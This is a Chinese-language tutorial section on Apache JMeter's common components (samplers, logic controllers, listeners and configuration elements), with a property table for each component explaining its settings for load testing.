<img src="/p/22fcd8bb/JMeter%E4%B8%BB%E9%A1%B5%E9%9D%A2.webp" alt="JMeter主页面"></p>
<hr>
<h1 id="常用配置元件介绍">3. 常用配置元件介绍</h1>
<blockquote>
<p>参考资料：https://jmeter.apache.org/usermanual/component_reference.html
## 3.1. 采样器 ### 3.1.1. FTP 请求
  此采样器可用于发送<code>取回文件</code>或<code>上传文件</code>给 FTP 服务器。当下载文件时，可将文件存储于磁盘（本地文件）和 / 或放在响应数据中。
<img src="/p/22fcd8bb/FTP%E8%AF%B7%E6%B1%82%E9%87%87%E6%A0%B7%E5%99%A8%E9%85%8D%E7%BD%AE%E9%A1%B5%E9%9D%A2.webp" alt="FTP请求采样器配置页面"></p>
</blockquote>
<table>
<colgroup>
<col style="width: 23%">
<col style="width: 65%">
<col style="width: 11%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Server Name or IP</td>
<td>FTP 服务器的域名或 IP 地址</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Port</td>
<td>FTP 端口，如果填的端口 &lt;=0，JMeter 则使用默认的 FTP 端口</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Remote File</td>
<td> 要检索的文件，或上传的目标文件名称</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Local File</td>
<td> 要上传的本地文件，或要下载的目标文件（默认服务器文件名称）</td>
<td style="text-align: center;">上传时必填</td>
</tr>
<tr class="even">
<td> Local File Contents</td>
<td> 提供上传的文件内容，会覆盖 Local File 属性</td>
<td style="text-align: center;">上传时必填</td>
</tr>
<tr class="odd">
<td> get/put</td>
<td> 检索还是上传文件，单选</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Use Binary Mode</td>
<td> 是否使用二进制模式，默认 ASCII</td>
<td style="text-align: center;"> 是</td>
</tr>
<tr class="odd">
<td> Save File in Response</td>
<td> 是否将检索到的文件内容存储在响应数据中</td>
<td style="text-align: center;">下载时必填</td>
</tr>
<tr class="even">
<td> Username</td>
<td>FTP 账户用户名</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="odd">
<td> Password</td>
<td>FTP 账户密码</td>
<td style="text-align: center;">否</td>
</tr>
</tbody>
</table>
<h3 id="http请求">3.1.2. HTTP 请求</h3>
<p>  此采样器可用于发送 <code>HTTP/HTTPS</code> 请求给 Web 服务器，以及控制 JMeter 是否解析图像的 HTML 文件和其他嵌入资源，并发送 HTTP 请求来检索它们。如：图像、Applet、样式表（CSS）和从这些文件引用的资源、外部脚本、框架 / 内嵌框架、背景图像（正文、表格、TD、TR）、背景声音等。
<img src="/p/22fcd8bb/HTTP请求采样器配置页面.webp" alt="HTTP请求采样器配置页面"></p>
<table>
<colgroup>
<col style="width: 18%">
<col style="width: 75%">
<col style="width: 6%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Server</td>
<td>Web 服务器的域名或 IP 地址（不包含 http 前缀）</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Port</td>
<td>Web 服务器正在监听的端口，默认值：80</td>
<td style="text-align: center;"> 否</td>
</tr>
<tr class="even">
<td> Protocol</td>
<td>HTTP 请求协议，如：HTTP、HTTPS、FILE 等</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Method</td>
<td> 请求方法，如常见的：GET、POST、DELETE、PUT 等</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Content Encoding</td>
<td> 要使用的内容编码</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="odd">
<td> Redirect Automatically</td>
<td> 将基础 http 协议处理程序设置为自动重定向，设置后不会作为样本出现</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Follow Redirects</td>
<td> 将基础 http 协议处理程序设置为跟踪重定向（未启用自动重定向时可用）</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="odd">
<td> Use KeepAlive</td>
<td> 请求是否保持活动连接</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Use multipart/form-data</td>
<td> 是否对 POST 请求使用 multipart/form-data 类型数据</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="odd">
<td> Path</td>
<td> 资源的请求地址，如果资源需要查询参数，在 Parameters 中进行配置</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Parameters</td>
<td> 资源请求时所需要的参数，每一个参数都需要有参数名和值</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="odd">
<td> Body</td>
<td>HTTP 请求体，</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Files Upload</td>
<td> 待上传的文件名，如果为空，JMeter 不会发送文件；如果填写，JMeter 会自动以 multipart
form 形式发送请求</td>
<td style="text-align: center;">否</td>
</tr>
</tbody>
</table>
<h3 id="jdbc请求">3.1.3. JDBC 请求</h3>
<p>  此采样器可用于将 JDBC 请求（SQL 查询）发送到数据库。在使用它之前，需要添加一个 <code>JDBC Connection Configuration</code> 元件，参见 <a href="#3-4-5-JDBC%E8%BF%9E%E6%8E%A5%E9%85%8D%E7%BD%AE">3.4.5.
JDBC 连接配置</a>章节。 <img src="/p/22fcd8bb/JDBC请求采样器配置页面.webp" alt="JDBC请求采样器配置页面"></p>
<table>
<colgroup>
<col style="width: 21%">
<col style="width: 60%">
<col style="width: 18%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Variable Name of Pool declared</td>
<td> 连接池绑定到的 JMeter 变量的名称，必须与 JDBC 连接配置的<code>变量名称</code>字段一致</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Query Type</td>
<td> 查询类型，下拉选择，包含：选择语句、更新语句、预准备语句、可调用语句、提交、回滚等</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> SQL 查询</td>
<td> SQL 查询语句，不需要输入行尾的分号</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Parameter values</td>
<td> 以逗号分隔的参数值列表</td>
<td style="text-align: center;">预准备语句和可调用语句必填</td>
</tr>
<tr class="even">
<td> Variable Name</td>
<td> 以逗号分隔的变量名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="odd">
<td> Result Variable Name</td>
<td> 以逗号分隔的结果变量名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Query timeout(s)</td>
<td> 为查询设置超时（单位：秒），空值表示 0 代表无限制，-1 代表不设置任何查询超时，默认值为 0</td>
<td style="text-align: center;"> 否</td>
</tr>
<tr class="odd">
<td> Limit ResultSet</td>
<td> 限制循环访问结果集的行数，空值表示 - 1</td>
<td style="text-align: center;"> 否</td>
</tr>
<tr class="even">
<td> Handle ResultSet</td>
<td> 定义如何处理从可调用语句返回的结果集，包含：存储为字符串、存储为对象、计数记录等</td>
<td style="text-align: center;">否</td>
</tr>
</tbody>
</table>
<h2 id="逻辑控制器">3.2. 逻辑控制器</h2>
<blockquote>
<p>逻辑控制器确定采样器的处理顺序 ### 3.2.1. 事务控制器 (Transaction
Controller)
  事务控制器额外生成一个样本，用于测量其子级采样器的测试数据，常用于将单个事务的一个活多个采样器进行归纳合并，便于统计单个事务的样本性能情况。</p>
</blockquote>
<figure>
<img src="/p/22fcd8bb/事务控制器配置示例.webp" alt="事务控制器配置示例">
<figcaption aria-hidden="true">事务控制器配置示例</figcaption>
</figure>
<table>
<colgroup>
<col style="width: 40%">
<col style="width: 54%">
<col style="width: 4%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Generate Parent Sample</td>
<td> 是否生成父样本，如果勾选，将为其子级的采样器生成父级样本，否则子级的采样器将会单独生成样本</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Include duration of timer and pre-post processor in generated
sample</td>
<td> 是否在生成样本时包含计时器、预处理器和后置处理器的延迟时间，默认不勾选</td>
<td style="text-align: center;">是</td>
</tr>
</tbody>
</table>
<h3 id="循环控制器loop-controller">3.2.2. 循环控制器 (Loop
Controller)</h3>
<p>  循环控制器下存在子级的控制器或采样器时，JMeter 将会按照循环控制器的设置，循环运行它们一定次数。循环总次数 = 循环计数 * 线程组循环次数。例如：</p>
<ol type="1">
<li>线程组循环次数为 2 次，循环控制器循环次数为 3 次，那么循环控制器下的 Homepage 采样器将会被执行 6 次。</li>
<li>线程组循环次数为 10 次，循环控制器循环次数为无限，那么循环控制器下的 Homepage 采样器将会被无限循环执行。</li>
<li>线程组循环次数为无限，循环控制器循环次数为 20 次，那么循环控制器下的 Homepage 采样器将会被无限循环执行。</li>
<li>线程组循环次数为 10 次或无限，且持续时间为 60 秒，循环控制器循环次数为 5 次或无限，那么循环控制器下的 Homepage 采样器将会被无限循环执行，直至 60 秒后停止。</li>
</ol>
<figure>
<img src="/p/22fcd8bb/%E5%BE%AA%E7%8E%AF%E6%8E%A7%E5%88%B6%E5%99%A8%E5%BE%AA%E7%8E%AF%E6%AC%A1%E6%95%B0%E8%AE%A1%E7%AE%97.webp" alt="循环控制器循环次数计算">
<figcaption aria-hidden="true">循环控制器循环次数计算</figcaption>
</figure>
<h3 id="判断控制器if-controller">3.2.3. 判断控制器 (IF Controller)</h3>
<p>  判断控制器通过配置的判断表达式（计算结果必须为 boolean 值）的执行结果，来控制其子级的配置元件是否运行。</p>
<figure>
<img src="/p/22fcd8bb/%E5%88%A4%E6%96%AD%E6%8E%A7%E5%88%B6%E5%99%A8%E9%85%8D%E7%BD%AE%E9%A1%B5%E9%9D%A2.webp" alt="判断控制器配置页面">
<figcaption aria-hidden="true">判断控制器配置页面</figcaption>
</figure>
<table>
<colgroup>
<col style="width: 24%">
<col style="width: 71%">
<col style="width: 4%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Condition</td>
<td> 默认情况下，填写可返回 boolen 值的 JavaScript 表达式，但也可填写为变量表达式（Interpret
Condition as Variable Expression 被勾选时）</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Interpret Condition as Variable Expression?</td>
<td> 此项勾选时，必须在 Condition 中输入计算结果为 <code>true</code> 的表达式（忽略大小写）</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Evaluation for all children</td>
<td> 子级是否计算，未勾选时，仅在首次进入运行时计算</td>
<td style="text-align: center;">是</td>
</tr>
</tbody>
</table>
<h2 id="监听器">3.3. 监听器</h2>
<h3 id="图表结果">3.3.1. 图表结果</h3>
<p>  图表结果用于生成一个简单的图表，绘制所有采样器的采样时间，展示的内容包含：当前样本（黑色）、所有样本当前平均值（蓝色）、当前标准差（红色）、吞吐率（绿色）和中位数值（紫色）。</p>
<figure>
<img src="/p/22fcd8bb/图表结果示例.webp" alt="图表结果示例">
<figcaption aria-hidden="true">图表结果示例</figcaption>
</figure>
<h3 id="断言结果">3.3.2. 断言结果</h3>
<p>  断言结果可视化工具展示每一个样本的标签，同时展示测试计划中所有断言的结果。</p>
<figure>
<img src="/p/22fcd8bb/断言结果示例.webp" alt="断言结果示例">
<figcaption aria-hidden="true">断言结果示例</figcaption>
</figure>
<h3 id="查看结果树">3.3.3. 查看结果树</h3>
<p>  查看结果树以树状列表的形式展示所有采样器的响应情况，允许查看每一个样本的请求信息、响应信息、耗时、状态码等，样本状态成功时为绿色，失败时为红色，以此判断各采样器配置的正确性。</p>
<figure>
<img src="/p/22fcd8bb/查看结果树页面示例.webp" alt="查看结果树页面示例">
<figcaption aria-hidden="true">查看结果树页面示例</figcaption>
</figure>
<h3 id="聚合报表">3.3.4. 聚合报表</h3>
<p>  聚合报表（Aggregate
Report）也称为汇总报表，它为测试计划中每一个不同命名的请求创建一个表行，对于每个请求，汇总响应信息、请求计数、平均值、最大值、最小值、错误率、吞吐量等性能指标信息，性能测试结果的分析数据来源也一般参考于此。</p>
<figure>
<img src="/p/22fcd8bb/聚合报表结果示例.webp" alt="聚合报表结果示例">
<figcaption aria-hidden="true">聚合报表结果示例</figcaption>
</figure>
<table>
<colgroup>
<col style="width: 7%">
<col style="width: 12%">
<col style="width: 80%">
</colgroup>
<thead>
<tr class="header">
<th>字段名称</th>
<th>英文名称</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>标签</td>
<td> Label</td>
<td> 采样器的标签名称</td>
</tr>
<tr class="even">
<td>样本</td>
<td>#Samples</td>
<td> 具有相同标签的样本发送总数量</td>
</tr>
<tr class="odd">
<td>平均值</td>
<td> Average</td>
<td> 该样本的结果集的平均时间</td>
</tr>
<tr class="even">
<td>中位数</td>
<td> Median</td>
<td> 该样本结果集的中位数，剩余 50% 至少需要这么长时间</td>
</tr>
<tr class="odd">
<td> 90% 线</td>
<td> 90%Line</td>
<td>90% 的样本数量的最长时间，剩余 10% 至少需要这么长时间</td>
</tr>
<tr class="even">
<td> 95% 线</td>
<td> 95%Line</td>
<td>95% 的样本数量的最长时间，剩余 5% 至少需要这么长时间</td>
</tr>
<tr class="odd">
<td> 99% 线</td>
<td> 99%Line</td>
<td>99% 的样本数量的最长时间，剩余 1% 至少需要这么长时间</td>
</tr>
<tr class="even">
<td>最大值</td>
<td> Max</td>
<td> 该样本结果集中的最长时间</td>
</tr>
<tr class="odd">
<td>最小值</td>
<td> Min</td>
<td> 该样本结果集中的最短时间</td>
</tr>
<tr class="even">
<td>错误率</td>
<td> Error%</td>
<td> 该样本内包含错误请求的百分比</td>
</tr>
<tr class="odd">
<td>吞吐量</td>
<td> Throughtput</td>
<td> 以每秒 / 分钟 / 小时的请求数量来衡量服务器的处理能力，当导出为 csv 文件时，单位为：请求 / 秒</td>
</tr>
<tr class="even">
<td>接收速率</td>
<td> Received KB/s</td>
<td> 客户端每秒钟接收的千字节数据，衡量客户端与服务端的网络通信能力</td>
</tr>
<tr class="odd">
<td>发送速率</td>
<td> Send KB/s</td>
<td> 客户端每秒钟发送的千字节数据，衡量客户端与服务端的网络通信能力</td>
</tr>
</tbody>
</table>
<h3 id="总结报表">3.3.5. 总结报表</h3>
<p>  总结报表（Summary
Report）也称为摘要报表，报表内容与 <a href="#3.3.4. 聚合报表">3.3.4.&nbsp;聚合报表</a>类似，新增了两个字段，如下表所示。</p>
<figure>
<img src="/p/22fcd8bb/总结报表结果示例.webp" alt="总结报表结果示例">
<figcaption aria-hidden="true">总结报表结果示例</figcaption>
</figure>
<table>
<thead>
<tr class="header">
<th>字段名称</th>
<th>英文名称</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>标准偏差</td>
<td> Std.Dev.</td>
<td> 该样本的消耗时间的标准偏差</td>
</tr>
<tr class="even">
<td>平均字节大小</td>
<td> Avg.Btyes</td>
<td> 该样本响应报文的平均字节大小</td>
</tr>
</tbody>
</table>
<h3 id="响应时间图">3.3.6. 响应时间图</h3>
<p>  响应时间图以线状图的形式，将测试过程中的响应时间变化请求绘制成折线图，如果同一个时间戳包含多个样本，则会展示平均值。</p>
<figure>
<img src="/p/22fcd8bb/响应时间图示例.webp" alt="响应时间图示例">
<figcaption aria-hidden="true">响应时间图示例</figcaption>
</figure>
<h2 id="配置元件">3.4. 配置元件</h2>
<h3 id="csv数据集">3.4.1. CSV 数据集</h3>
<p>  csv 数据集用于从外部文件中按行读取数据，再按照指定分隔符分隔成多个变量，其非常适合处理大量的变量。</p>
<figure>
<img src="/p/22fcd8bb/CSV数据集配置示例.webp" alt="CSV数据集配置示例">
<figcaption aria-hidden="true">CSV 数据集配置示例</figcaption>
</figure>
<table>
<colgroup>
<col style="width: 11%">
<col style="width: 85%">
<col style="width: 2%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Filename</td>
<td> 文件名称，建议使用相对路径，并将数据集文件与 jmx 脚本放置在同一层路径下</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> File Encoding</td>
<td> 文件内容编码</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Variable Names</td>
<td> 变量名，如有多个，用英文逗号分隔</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="odd">
<td> Use first line as VariableNames</td>
<td> 是否读取第一行作为变量名。当 <code>Variable Names</code> 为空时使用，且如果 <code>Variable Names</code> 为空时，数据文件中第一行将被作为变量名使用</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Delimiter</td>
<td> 内容分隔符，建议使用与数据内容无关的字符</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Allow quoted data</td>
<td> 是否允许数据包含引号</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Recycle on EOF?</td>
<td> 文件内容循环结束后是否重新循环</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Stop thread on EOF?</td>
<td> 文件内容循环结束后是否停止线程</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Sharing mode</td>
<td> 共享模式<br>All
threads：文件在所有的线程和线程组之间共享，总打开次数 = 1<br>Current
thread
group：当前线程组用到此文件时打开一次，总打开次数 = 用到的线程组数<br>Current
thread：线程用到此文件时打开一次，总打开次数 = 用到的线程组数 * 线程数</td>
<td style="text-align: center;">是</td>
</tr>
</tbody>
</table>
<h3 id="http缓存管理器">3.4.2. HTTP 缓存管理器</h3>
<p>  HTTP 缓存管理器用于向其范围内的 HTTP 请求添加缓存功能，以模拟浏览器的缓存功能，每个虚拟用户线程都会生成自己的缓存。</p>
<figure>
<img src="/p/22fcd8bb/HTTP缓存管理器配置示例.webp" alt="HTTP缓存管理器配置示例">
<figcaption aria-hidden="true">HTTP 缓存管理器配置示例</figcaption>
</figure>
<table>
<colgroup>
<col style="width: 35%">
<col style="width: 59%">
<col style="width: 4%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Clear cache each iteration</td>
<td> 每次循环时是否清除缓存</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Use Cache Control/Expires header<br>when processing GET
requests</td>
<td> 处理 GET 请求时，是否使用缓存控制 / 过期标头</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Max Number of elements in cache</td>
<td> 缓存中元素的最大数量，缓存的元素越多，该配置元件消耗内存越大，需要<br>适时修改 jmeter 启动脚本中的 <code>-Xmx</code> 选项</td>
<td style="text-align: center;">是</td>
</tr>
</tbody>
</table>
<h3 id="http-cookie管理器">3.4.3. HTTP Cookie 管理器</h3>
<p>  HTTP Cookie 管理器主要具备以下两个功能：</p>
<ol type="1">
<li>模拟网络浏览器一样存储和发送 cookies，例如有一个 HTTP 请求的响应中包含 cookie，那么 HTTP
Cookie 管理器会自动存储该 cookie，并在后续的 http 请求中使用该 cookie，每一个线程都有自己的 cookies 存储区域。</li>
<li>允许手动将 cookies 信息添加到 HTTP
Cookie 管理器中，这部分的 cookies 信息将会被共享于所有线程。</li>
</ol>
<figure>
<img src="/p/22fcd8bb/HTTP%20Cookie管理器配置示例.webp" alt="HTTP Cookie管理器配置示例">
<figcaption aria-hidden="true">HTTP Cookie 管理器配置示例</figcaption>
</figure>
<table>
<colgroup>
<col style="width: 46%">
<col style="width: 27%">
<col style="width: 26%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Clear cookie each iteration</td>
<td> 每次循环时是否清除 cookie</td>
<td style="text-align: center;"> 是</td>
</tr>
<tr class="odd">
<td> Use Thread Group configuration<br>to control cookie clearing</td>
<td> 使用线程组配置来控制 cookie 是否清除</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Cookie Policy</td>
<td> 将用于管理 cookie 的政策，保持默认即可</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Use-Defind Cookies</td>
<td> 用户自定义的 cookie</td>
<td style="text-align: center;"> 否（不鼓励，除非你知道你在干什么）</td>
</tr>
</tbody>
</table>
<h3 id="jdbc连接配置">3.4.4. JDBC 连接配置</h3>
<p>  JDBC 连接配置元件从提供的 JDBC 连接设置创建数据库连接，当业务请求的返回体中未包含后续样本所需的数据，以及需要针对数据库性能进行测试等场景时，就需要用到这个配置元件。</p>
<figure>
<img src="/p/22fcd8bb/JDBC连接配置示例.webp" alt="JDBC连接配置示例">
<figcaption aria-hidden="true">JDBC 连接配置示例</figcaption>
</figure>
<table>
<colgroup>
<col style="width: 25%">
<col style="width: 69%">
<col style="width: 5%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Variable Name for created pool</td>
<td> 数据库连接池的变量名</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Max Number of connections</td>
<td> 连接池中的最大连接数</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Max Wait(ms)</td>
<td> 最大等待时间（毫秒），如果尝试连接的过程中超时最大等待时间，则连接池就抛出错误</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Time Between Eviction Runs(ms)</td>
<td> 线程可空闲时间（毫秒），如果当前连接池中某个链接在空闲了指定时间后仍然没有使用，则被物理性的关闭掉</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Auto Commit</td>
<td> 是否自动提交</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Transaction isolation</td>
<td> 事务隔离级别</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Preinit Pool</td>
<td> 连接池会被立即初始化，如果设置为 <code>False（默认）</code>，使用此连接池的 JDBC 请求采样器可能会测量第一个查询的更高响应时间</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="odd">
<td> Init sql statements separated by new line</td>
<td>SQL 语句集合，当首次创建物理连接时执行一次</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Test While Idle</td>
<td> 闲置时测试，保持默认即可</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Soft Min Evictable Idle Time(ms)</td>
<td> 闲置时间，保持默认即可</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Validation Query</td>
<td> 校验查询语句，从下拉列表中选择一条简单的语句，验证数据库连接是否仍在响应</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="odd">
<td> Database URL</td>
<td> 数据库的 JDBC 连接字符串</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> JDBC Driver class</td>
<td>JDBC 的驱动类，根据所使用的数据库进行选择，类文件必须在 JMeter/lib 文件夹下存在</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Username</td>
<td> 数据库连接用户名</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Password</td>
<td> 数据库连接密码</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="odd">
<td> Connection Properties</td>
<td> 数据库建立连接时要设置的连接属性</td>
<td style="text-align: center;">否</td>
</tr>
</tbody>
</table>
<h3 id="用户自定义变量">3.4.5. 用户自定义变量</h3>
<p>  用户自定义变量元件允许用户自定义和初始化变量集，供后续的配置元件使用。</p>
<blockquote>
<p>注意：</p>
<ol type="1">
<li>用户自定义变量配置文件无需指定位置，它会在开始执行测试前进行处理。</li>
<li>如果一个测试计划中包含多个线程组，请确保对不同的值使用不同的变量名，因为该元件会在线程组之间共享。此外，这些变量在元素处理完毕后才能使用，因此你无法引用在同一元素中定义的变量。</li>
</ol>
</blockquote>
<figure>
<img src="/p/22fcd8bb/用户自定义变量配置示例.webp" alt="用户自定义变量配置示例">
<figcaption aria-hidden="true">用户自定义变量配置示例</figcaption>
</figure>
<table>
<colgroup>
<col style="width: 16%">
<col style="width: 77%">
<col style="width: 5%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> User Defined Variables</td>
<td> 变量键值对，name 中的内容将放在变量表达式 <code>${...}</code> 构造的括号中，整个 <code>${...}</code> 将会在运行时自动替换成对应的值</td>
<td style="text-align: center;">否</td>
</tr>
</tbody>
</table>
<h3 id="随机变量">3.4.6. 随机变量</h3>
<p>随机变量配置元件用于生成随机的数字字符串，并存储在变量中，供后续的配置元件使用。</p>
<figure>
<img src="/p/22fcd8bb/随机变量元件配置示例.webp" alt="随机变量元件配置示例">
<figcaption aria-hidden="true">随机变量元件配置示例</figcaption>
</figure>
<table>
<colgroup>
<col style="width: 10%">
<col style="width: 84%">
<col style="width: 4%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Variable Name</td>
<td> 变量名称，用于存储随机字符串值</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Format string</td>
<td> 指定随机字符串的格式。<br>例如 “000” 将会生成 3 位数的随机字符串，<br>“user_0000” 将会生成类似于 <code>user_0294</code> 的随机字符串</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Minimum Value</td>
<td> 随机数生成器的取值范围最小值</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="odd">
<td> Maximum Value</td>
<td> 随机数生成器的取值范围最大值</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Random Seed</td>
<td> 随机种子，如果指定了随机种子，并将 Per
Thread (User) 设置为 <code>True</code>，则每个线程得到的值相同；<br>为空时，将使用随机的默认构造函数生成随机种子</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="odd">
<td> Per Thread(User)?</td>
<td> 如果为 <code>False</code>，则生成器在线程组中的所有线程之间共享，否则每个线程都会有自己的随机生成器</td>
<td style="text-align: center;">是</td>
</tr>
</tbody>
</table>
<h3 id="计数器">3.4.7. 计数器</h3>
<p>  允许用户添加一个计数器，在整个线程组中进行引用，计数器配置的内容包含：起始点、增量和终止点（含）。计数器将会在起始点循环计数到终止点，循环完成后再次从起始点开始，直至测试结束。</p>
<figure>
<img src="/p/22fcd8bb/计数器配置示例.webp" alt="计数器配置示例">
<figcaption aria-hidden="true">计数器配置示例</figcaption>
</figure>
<table>
<colgroup>
<col style="width: 21%">
<col style="width: 75%">
<col style="width: 3%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>描述</th>
<th style="text-align: center;">是否必填</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> Name</td>
<td> 用于组件树页面展示的名称</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Starting value</td>
<td> 计数器的起始值，未填时默认为 0</td>
<td style="text-align: center;"> 否</td>
</tr>
<tr class="odd">
<td> Increment</td>
<td> 技术增量，默认为 0，表示无增量</td>
<td style="text-align: center;">是</td>
</tr>
<tr class="even">
<td> Maximum value</td>
<td> 计数器的最大值，默认值是 Long 类型</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="odd">
<td> Format</td>
<td> 计数器输出的数字格式，例如 “000” 将会生成 3 位数的随机字符串，<br>“user_0000” 将会生成类似于 <code>user_0294</code> 的随机字符串</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="even">
<td> Exported Variable Name</td>
<td> 变量名称，用于存储计数器的值</td>
<td style="text-align: center;">否</td>
</tr>
<tr class="odd">
<td> Track Counter Independently for each User</td>
<td> 是否为每个用户单独分配计数器。<br>未选中时，计数器是全局的，第一次迭代时，用户 1 获得 1，用户 2 获得 2，依次类推；<br>若选中，则第一次迭代时，所有用户获得的值均是 1</td>
<td style="text-align: center;"> 否</td>
</tr>
<tr class="even">
<td> Reset counter on each Thread Group Iteration</td>
<td> 此选项仅在计数器为每个用户单独分配时有效。<br>选中时，计数器将重置为每个线程组迭代的起始值，当计数器在循环控制器内时将会很有用</td>
<td style="text-align: center;">是</td>
</tr>
</tbody>
